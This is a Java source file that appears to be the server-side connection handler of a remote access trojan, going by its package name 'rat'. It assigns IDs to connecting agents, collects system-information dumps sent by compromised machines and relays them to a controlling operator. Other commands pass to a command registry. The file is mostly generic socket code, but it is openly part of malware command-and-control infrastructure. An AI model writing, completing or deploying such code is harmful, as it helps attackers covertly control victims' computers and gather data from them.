package com.stoppedwumm.rat.ServerShit;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.UUID;

import com.stoppedwumm.rat.App;

public class Handler implements Runnable {
    private Socket clientSocket;
    private String clientId;
    private PrintWriter out;
    private BufferedReader in;
    private volatile boolean running = true;
    private App serverInstance;

    // State for buffering multi-line agent responses (specifically for system info)
    private boolean isBufferingSysInfoFromAgent = false;
    private StringBuilder sysInfoBuffer = new StringBuilder();
    private String sysInfoRelayTargetControllerId = null; // The controller to send the full info to

    // Define markers exactly as the AgentClient sends them
    private static final String AGENT_SYS_INFO_START_MARKER = "AGENT_SYS_INFO_START";
    private static final String AGENT_SYS_INFO_END_MARKER = "AGENT_SYS_INFO_END";


    public Handler(Socket socket, App serverInstance) {
        this.clientSocket = socket;
        this.serverInstance = serverInstance;
    }

    public String getClientId() {
        return clientId;
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    private void assignAndSendId() throws IOException {
        this.clientId = UUID.randomUUID().toString();
        out.println("ID:" + this.clientId);
        System.out.println("[" + Thread.currentThread().getName() + "] Assigned ID " + this.clientId + " to client " + clientSocket.getInetAddress().getHostAddress());
    }

    @Override
    public void run() {
        try {
            out = new PrintWriter(clientSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

            assignAndSendId();
            serverInstance.registerClient(this.clientId, this);

            System.out.println("[" + Thread.currentThread().getName() + "] Handler started for client [" + clientId + "]: " + clientSocket.getInetAddress().getHostAddress());

            String inputLine;
            while (running && (inputLine = in.readLine()) != null) {
                System.out.println("[" + Thread.currentThread().getName() + "] Raw Received from [" + clientId + "]: " + inputLine);

                if (isBufferingSysInfoFromAgent) {
                    // We are in the middle of collecting system info lines from this agent
                    sysInfoBuffer.append("\n").append(inputLine); // Add the current line to buffer
                    if (inputLine.trim().equals(AGENT_SYS_INFO_END_MARKER)) {
                        // End of sys info block detected
                        System.out.println("[" + Thread.currentThread().getName() + "] Finished buffering sys_info from agent [" + clientId + "]");
                        serverInstance.relayMessage(this.clientId, sysInfoRelayTargetControllerId, sysInfoBuffer.toString());

                        // Reset state
                        isBufferingSysInfoFromAgent = false;
                        sysInfoBuffer.setLength(0);
                        sysInfoRelayTargetControllerId = null;
                    }
                    // Do not pass these intermediate lines to CommandRegistry
                } else {
                    // Not currently buffering, treat as a potential command or start of bufferable sequence
                    if ("EXIT".equalsIgnoreCase(inputLine.trim())) {
                        System.out.println("[" + Thread.currentThread().getName() + "] Client [" + clientId + "] requested disconnect.");
                        sendMessage("SERVER: Disconnecting you now.");
                        running = false;
                        break;
                    }

                    // Check if this line is an agent starting to send system info
                    // Expected format from agent: "RELAY <controllerId> AGENT_SYS_INFO_START"
                    String[] parts = inputLine.trim().split("\\s+", 3);
                    if (parts.length == 3 &&
                        "RELAY".equalsIgnoreCase(parts[0]) &&
                        parts[2].trim().equals(AGENT_SYS_INFO_START_MARKER)) {

                        this.sysInfoRelayTargetControllerId = parts[1]; // The controller ID from agent's RELAY command
                        this.isBufferingSysInfoFromAgent = true;
                        this.sysInfoBuffer.setLength(0); // Clear/initialize buffer
                        this.sysInfoBuffer.append(parts[2]); // Start buffer with "AGENT_SYS_INFO_START"

                        System.out.println("[" + Thread.currentThread().getName() + "] Started buffering sys_info from agent [" + clientId + "] for controller [" + this.sysInfoRelayTargetControllerId + "]");
                        // IMPORTANT: We DO NOT relay this first "RELAY ... AGENT_SYS_INFO_START" line immediately.
                        // We wait for the AGENT_SYS_INFO_END and send the whole block.
                        // This prevents the controller from getting the start marker twice or partial data.
                    } else {
                        // Not an EXIT, and not the start of an agent's sys info dump.
                        // Process as a regular command (e.g., a command from a Controller,
                        // or a different type of RELAY from an Agent).
                        serverInstance.getCommandRegistry().processCommand(this, serverInstance, inputLine);
                    }
                }
            }
        } catch (IOException e) {
            if (running) {
                System.err.println("[" + Thread.currentThread().getName() + "] IOException in handler for client [" + clientId + " " + clientSocket.getInetAddress().getHostAddress() + "]: " + e.getMessage());
            }
        } finally {
            System.out.println("[" + Thread.currentThread().getName() + "] Handler for client [" + (clientId != null ? clientId : clientSocket.getInetAddress().getHostAddress()) + "] shutting down.");
            serverInstance.unregisterClient(this.clientId);
            closeConnection();
        }
    }

    public void sendMessage(String message) {
        if (out != null && !clientSocket.isClosed()) {
            out.println(message);
        } else {
            System.err.println("[" + Thread.currentThread().getName() + "] Cannot send message to client [" + (clientId != null ? clientId : "N/A") + "]: socket closed or output stream null.");
        }
    }

    public void closeConnection() {
        running = false;
        try {
            if (in != null) in.close();
        } catch (IOException e) { /* ignore */ }
        if (out != null) {
            out.close();
            if (out.checkError()) {
                System.err.println("[" + Thread.currentThread().getName() + "] Error flag set on PrintWriter for client [" + (clientId != null ? clientId : "N/A") + "]");
            }
        }
        try {
            if (clientSocket != null && !clientSocket.isClosed()) clientSocket.close();
        } catch (IOException e) { /* ignore */ }
        System.out.println("[" + Thread.currentThread().getName() + "] Resources closed for client [" + (clientId != null ? clientId : "N/A") + "]");
    }
}